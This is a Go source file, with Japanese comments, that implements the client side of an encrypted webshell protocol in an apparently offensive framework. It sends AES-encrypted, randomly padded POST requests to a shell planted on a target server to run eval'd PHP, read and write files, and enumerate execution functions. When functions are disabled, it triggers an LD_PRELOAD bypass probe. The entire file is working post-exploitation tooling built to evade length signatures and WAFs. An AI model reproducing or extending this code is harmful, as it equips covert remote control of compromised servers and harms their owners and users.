// http_shell_enc.go は自作の暗号化シェル(phpenc/jspenc)のセッションドライバで、フェーズ 1a の階層拡張:
// 本ファイルは「伝送の暗号化ラップ」だけを実装する。平文 payload の構築(センチネル/関数フォールバック/クォート回避/分割)
// はフェーズ 1a の構築子をそのまま再利用する。HTTPShell.post 内の enc 分岐が同じ payload を
// 暗号化チャネル経由に切り替える。暗号化シェルの PHP 実行面はフェーズ 1a と同一: 目標側で PHP コード片を eval する。
//
//	プロトコル(独自規格。Godzilla/Behinder などの公開 webshell プロトコルとは無関係、リクエスト/レスポンスは同型):
//
//	リクエストボディ(生の POST body) = base64( nonce || ciphertext || tag )
//	平文フレーム = padLen(1B) || ランダムパディング(0〜64B) || JSON
//	リクエスト JSON: {"op":"exec|probe|read|write", ...}; フィールド値は常に base64/hex/列挙値
//	レスポンス JSON: {"ok":bool,"out":...,"err":...,"mode":"gcm|cbc"}
//
// 暗号化: AES-256-GCM(nonce 12B/tag 16B)を優先。目標の PHP に GCM がなければシェル本体が実行時に
// AES-256-CBC + HMAC-SHA256(encrypt-then-MAC、iv 16B/mac 32B、MAC を先に検証してから復号)へ降格する。
// モードは最初の暗号化プローブで双方向にラッチ: まず gcm、認証失敗なら cbc を試し、成功したモードを記憶して DB に保存する(Secret.EncMode)。
// 以降のリクエストは 1 回だけで再試行しない(exec は副作用があるため二重送信しない)。
// 鍵: シェル本体の生成時に crypto/rand で 32B を生成し、セッションごとに独立。nonce はリクエストごとにランダム。
package session

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

const (
	encGCMNonce = 12 // GCM nonce の長さ
	encGCMTag   = 16 // GCM tag の長さ
	encCBCIV    = 16 // CBC iv の長さ
	encCBCMAC   = 32 // CBC 経路の HMAC-SHA256 長
	encMaxPad   = 64 // ランダムパディングの上限(0〜64B、長さシグネチャの無効化)
)

// encCryptoError は「認証/復号層」の失敗(tag/HMAC 不一致、フレーム不正)を表す。モード再試行(gcm↔cbc)を
// 許すのはこの種のエラーだけ。HTTP/base64 系のエラーはそのまま報告し、意味を混同しない。
type encCryptoError struct{ msg string }

func (e *encCryptoError) Error() string { return e.msg }

// encRequest はリクエスト平文 JSON。Code は常に payload の base64(プロトコルではフィールド値にクォートも
// バックスラッシュも含めないと定めており、目標側に JSON ライブラリがなくても素朴に解析できる)。
type encRequest struct {
	Op   string `json:"op"`
	Code string `json:"code,omitempty"`
	S    string `json:"s,omitempty"`
	Path string `json:"path,omitempty"`
	Data string `json:"data,omitempty"`
	App  string `json:"app,omitempty"`
}

// encResponse はレスポンス平文 JSON。exec/read の Out は出力の base64、probe の Out は
// 相手側がエコーするプローブ用のランダム文字列。
type encResponse struct {
	OK   bool   `json:"ok"`
	Out  string `json:"out"`
	Err  string `json:"err"`
	Mode string `json:"mode"`
}

// encTransport は暗号化シェルの伝送層: frame → seal → POST → open → unframe。
type encTransport struct {
	url    string
	key    []byte
	client *http.Client

	mu   sync.RWMutex
	mode string // "" は未ラッチ、"gcm" / "cbc"
}

// Mode はラッチ済みの暗号化モードを返す(未ラッチなら空)。
func (t *encTransport) Mode() string {
	t.mu.RLock()
	defer t.mu.RUnlock()
	return t.mode
}

// SetMode は DB に保存されたモードを復元する(プロセス再起動後の再プローブを不要にする)。
func (t *encTransport) SetMode(m string) {
	if m != "gcm" && m != "cbc" {
		return
	}
	t.mu.Lock()
	t.mode = m
	t.mu.Unlock()
}

// ---------------- 暗号化/復号プリミティブ(ドライバとテスト用の模擬シェルが共用) ----------------

// encSubKey は CBC 経路のサブ鍵を導出する: sha256(key || ドメイン区切り文字列)。
func encSubKey(key []byte, domain string) []byte {
	h := sha256.New()
	h.Write(key)
	h.Write([]byte(domain))
	return h.Sum(nil)
}

// encFrame はランダムパディング付きのフレームを組み立てる: padLen(1B) || ランダムパディング(0〜64B) || payload。
func encFrame(payload []byte) []byte {
	var b [1]byte
	_, _ = rand.Read(b[:])
	n := int(b[0]) % (encMaxPad + 1)
	f := make([]byte, 1+n+len(payload))
	f[0] = byte(n)
	_, _ = rand.Read(f[1 : 1+n])
	copy(f[1+n:], payload)
	return f
}

// encUnframe はフレームを剥がす: パディング長を検証して payload を返す。
func encUnframe(f []byte) ([]byte, error) {
	if len(f) < 1 {
		return nil, &encCryptoError{"平文フレームが空"}
	}
	n := int(f[0])
	if len(f) < 1+n {
		return nil, &encCryptoError{"平文フレームが不正: パディング長が範囲外"}
	}
	return f[1+n:], nil
}

// pkcs7Pad / pkcs7Unpad は openssl のデフォルト PKCS7 パディングと一致する。
func pkcs7Pad(p []byte, block int) []byte {
	n := block - len(p)%block
	out := make([]byte, len(p)+n)
	copy(out, p)
	for i := len(p); i < len(out); i++ {
		out[i] = byte(n)
	}
	return out
}

func pkcs7Unpad(p []byte, block int) ([]byte, error) {
	if len(p) == 0 || len(p)%block != 0 {
		return nil, &encCryptoError{"CBC 平文長がブロックサイズの整数倍でない"}
	}
	n := int(p[len(p)-1])
	if n < 1 || n > block || n > len(p) {
		return nil, &encCryptoError{"CBC パディングが不正"}
	}
	for i := len(p) - n; i < len(p); i++ {
		if int(p[i]) != n {
			return nil, &encCryptoError{"CBC パディングのバイトが不一致"}
		}
	}
	return p[:len(p)-n], nil
}

// encCrypt は 1 フレームを暗号化する(パディング付きフレームの構築は含まない): nonce/iv || ciphertext || tag/mac を返す。
func encCrypt(key []byte, mode string, frame []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	switch mode {
	case "gcm":
		g, err := cipher.NewGCM(block)
		if err != nil {
			return nil, err
		}
		nonce := make([]byte, encGCMNonce)
		_, _ = rand.Read(nonce)
		return g.Seal(nonce, nonce, frame, nil), nil
	case "cbc":
		iv := make([]byte, encCBCIV)
		_, _ = rand.Read(iv)
		padded := pkcs7Pad(frame, aes.BlockSize)
		ct := make([]byte, len(padded))
		cipher.NewCBCEncrypter(block, iv).CryptBlocks(ct, padded)
		mac := hmac.New(sha256.New, encSubKey(key, "artex-mac-v1"))
		mac.Write(iv)
		mac.Write(ct)
		out := make([]byte, 0, len(iv)+len(ct)+encCBCMAC)
		out = append(out, iv...)
		out = append(out, ct...)
		return append(out, mac.Sum(nil)...), nil
	}
	return nil, opError("http", "未知の暗号化モード %q", mode)
}

// encDecrypt は 1 フレームを復号する(encCrypt の鏡像): GCM は tag を検証し、CBC は先に HMAC を検証してから復号する。
func encDecrypt(key []byte, mode string, blob []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	switch mode {
	case "gcm":
		if len(blob) < encGCMNonce+encGCMTag+1 {
			return nil, &encCryptoError{"暗号文フレームが短すぎます(GCM)"}
		}
		g, err := cipher.NewGCM(block)
		if err != nil {
			return nil, err
		}
		pt, err := g.Open(nil, blob[:encGCMNonce], blob[encGCMNonce:], nil)
		if err != nil {
			return nil, &encCryptoError{"レスポンスの認証に失敗しました(tag 不一致): レスポンスの改ざん、または鍵/モードの不一致"}
		}
		return pt, nil
	case "cbc":
		if len(blob) < encCBCIV+encCBCMAC+aes.BlockSize {
			return nil, &encCryptoError{"暗号文フレームが短すぎます(CBC)"}
		}
		iv := blob[:encCBCIV]
		ct := blob[encCBCIV : len(blob)-encCBCMAC]
		mac := blob[len(blob)-encCBCMAC:]
		m := hmac.New(sha256.New, encSubKey(key, "artex-mac-v1"))
		m.Write(iv)
		m.Write(ct)
		if !hmac.Equal(mac, m.Sum(nil)) {
			return nil, &encCryptoError{"レスポンスの認証に失敗しました(HMAC 不一致): レスポンスの改ざん、または鍵/モードの不一致"}
		}
		if len(ct)%aes.BlockSize != 0 {
			return nil, &encCryptoError{"CBC 暗号文長がブロックサイズの整数倍でない"}
		}
		pt := make([]byte, len(ct))
		cipher.NewCBCDecrypter(block, iv).CryptBlocks(pt, ct)
		return pkcs7Unpad(pt, aes.BlockSize)
	}
	return nil, opError("http", "未知の暗号化モード %q", mode)
}

// ---------------- 伝送 ----------------

// doOnce は暗号化リクエストを 1 回送信してレスポンスを復号する。エラーは層別: ネットワーク/HTTP/base64 以外はそのまま報告し、
// tag/HMAC/フレームの失敗は *encCryptoError で包む(モード再試行の判定用)。
func (t *encTransport) doOnce(ctx context.Context, req encRequest, mode string, timeout time.Duration) (*encResponse, error) {
	payload, err := json.Marshal(req)
	if err != nil {
		return nil, opError("http", "リクエスト JSON のシリアライズに失敗しました: %v", err)
	}
	blob, err := encCrypt(t.key, mode, encFrame(payload))
	if err != nil {
		return nil, err
	}
	if timeout <= 0 {
		timeout = defaultHTTPTimeout
	}
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	hreq, err := http.NewRequestWithContext(ctx, http.MethodPost, t.url,
		strings.NewReader(base64.StdEncoding.EncodeToString(blob)))
	if err != nil {
		return nil, opError("http", "リクエストの構築に失敗しました: %v", err)
	}
	hreq.Header.Set("Content-Type", "text/plain")
	hreq.Header.Set("User-Agent", "Mozilla/5.0 (ARTEX)")
	resp, err := t.client.Do(hreq)
	if err != nil {
		return nil, opError("http", "HTTP リクエストに失敗しました(目標に到達できない/タイムアウト/接続リセット): %v", err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, maxBodyRead))
	if err != nil {
		return nil, opError("http", "レスポンスの読み取りに失敗しました: %v", err)
	}
	if resp.StatusCode == http.StatusNotFound {
		return nil, opError("http", "暗号化シェルが存在しません(HTTP 404): シェル本体が削除されたか、パスが誤っている可能性があります")
	}
	if resp.StatusCode >= 400 {
		return nil, opError("http", "目標が HTTP %d を返しました(シェルが削除されたか、WAF にブロックされた可能性): %s",
			resp.StatusCode, excerpt(string(body), 200))
	}
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(string(body)))
	if err != nil {
		return nil, opError("http", "レスポンスが base64 の暗号文ではありません: WAF のブロックページかシェル本体の失効(本プロトコル以外のエンドポイント)の疑い。エコー概要: %q",
			excerpt(string(body), 200))
	}
	pt, err := encDecrypt(t.key, mode, raw)
	if err != nil {
		return nil, err // *encCryptoError
	}
	frame, err := encUnframe(pt)
	if err != nil {
		return nil, err // *encCryptoError
	}
	var er encResponse
	if err := json.Unmarshal(frame, &er); err != nil {
		return nil, opError("http", "暗号文の復号には成功しましたが、レスポンス JSON が不正です(シェル本体のバージョン不一致？): %v", err)
	}
	return &er, nil
}

// do はラッチ済みのモードでリクエストを送る。未ラッチならまず gcm を試し、認証失敗なら cbc を試して、成功した時点でラッチする。
// ラッチ後は 1 回だけで再試行しない(exec は副作用があるため二重送信しない)。
func (t *encTransport) do(ctx context.Context, req encRequest, timeout time.Duration) (*encResponse, error) {
	if m := t.Mode(); m != "" {
		return t.doOnce(ctx, req, m, timeout)
	}
	var lastErr error
	for _, m := range []string{"gcm", "cbc"} {
		resp, err := t.doOnce(ctx, req, m, timeout)
		if err == nil {
			t.SetMode(m)
			return resp, nil
		}
		var ce *encCryptoError
		if !errors.As(err, &ce) {
			return nil, err // 認証層以外のエラーではモード再試行しない
		}
		lastErr = err
	}
	return nil, lastErr
}

// exec は HTTPShell.post の暗号化分岐の入口: op=exec、code は payload の base64。
func (t *encTransport) exec(ctx context.Context, code string, timeout time.Duration) (string, error) {
	resp, err := t.do(ctx, encRequest{Op: "exec", Code: b64e([]byte(code))}, timeout)
	if err != nil {
		return "", err
	}
	if !resp.OK {
		return "", opError("exec", "暗号化シェルの目標側での実行に失敗しました: %s", resp.Err)
	}
	out, err := base64.StdEncoding.DecodeString(resp.Out)
	if err != nil {
		return "", opError("exec", "レスポンスの out の base64 デコードに失敗しました(シェル本体のバージョン不一致): %v", err)
	}
	return string(out), nil
}

// probe は暗号化プローブ(Test 用): op=probe でランダム文字列をエコーさせ、同時にモードをラッチする。
func (t *encTransport) probe(ctx context.Context, timeout time.Duration) error {
	var b [8]byte
	_, _ = rand.Read(b[:])
	s := hex.EncodeToString(b[:])
	resp, err := t.do(ctx, encRequest{Op: "probe", S: s}, timeout)
	if err != nil {
		return err
	}
	if !resp.OK {
		return opError("test", "暗号化シェルのプローブが拒否されました: %s", resp.Err)
	}
	if resp.Out != s {
		return opError("test", "暗号化シェルのプローブエコーが一致しません(鍵の不一致、または本プロトコル以外のシェル本体)")
	}
	return nil
}

// ---------------- セッション構築 ----------------

// NewEncShell は暗号化シェルのセッションを構築する。lang は php/jsp/phpenc/jspenc を受け付ける。keyB64 は
// generate_webshell が返す key(base64 32B)。password は暗号化シェルでは意味を持たない。
func NewEncShell(shellURL, lang, keyB64 string) (*HTTPShell, error) {
	lang = strings.ToLower(strings.TrimSpace(lang))
	lang = strings.TrimSuffix(lang, "enc") // phpenc→php
	key, err := base64.StdEncoding.DecodeString(strings.TrimSpace(keyB64))
	if err != nil || len(key) != 32 {
		return nil, opError("probe", "暗号化シェルの鍵は base64 エンコードされた 32 バイトである必要があります(generate_webshell が返す key_b64)")
	}
	s, err := NewHTTPShell(shellURL, "cmd", lang)
	if err != nil {
		return nil, err
	}
	s.kind = "http_" + lang + "enc"
	s.enc = &encTransport{url: s.url, key: key, client: s.client}
	return s, nil
}

// ProbeEnc は暗号化シェルをプローブする: 暗号化プローブ(op=probe)でモードをラッチし、phpenc では続けて暗号化チャネル経由で
// 利用可能な実行関数を列挙する(フェーズ 1a のプローブ payload を再利用)。失敗時は意味のあるエラーを返し、成功を偽装しない。
func ProbeEnc(ctx context.Context, shellURL, lang, keyB64 string) (*HTTPShell, ProbeInfo, error) {
	s, err := NewEncShell(shellURL, lang, keyB64)
	if err != nil {
		return nil, ProbeInfo{}, err
	}
	if err := s.Test(ctx); err != nil { // enc 分岐: op=probe の暗号化プローブ
		return nil, ProbeInfo{}, err
	}
	info := ProbeInfo{Kind: s.kind, Lang: s.lang + "enc", Platform: s.platform, Variant: "eval"}
	if s.lang == "php" {
		caps, err := s.probePHPCaps(ctx)
		if err != nil {
			return nil, info, err
		}
		info.Funcs = caps.funcs
		info.Mail, info.Putenv = caps.mail, caps.putenv
		s.SetFuncs(caps.funcs)
		s.mailOK, s.putenvOK = caps.mail, caps.putenv
		if len(caps.funcs) == 0 {
			info.DisableFunctions = true
			s.disableFuncs = true
			// 平文 PHP eval シェルと同じ内蔵 LD_PRELOAD バイパスプローブ(暗号化チャネル経由で投与/発火)。
			if caps.mail && caps.putenv {
				s.probeBypass(ctx, &info)
			} else {
				info.BypassNote = "mail()/putenv() が揃って利用可能ではなく、LD_PRELOAD バイパスの前提を満たさない"
			}
		}
	}
	return s, info, nil
}
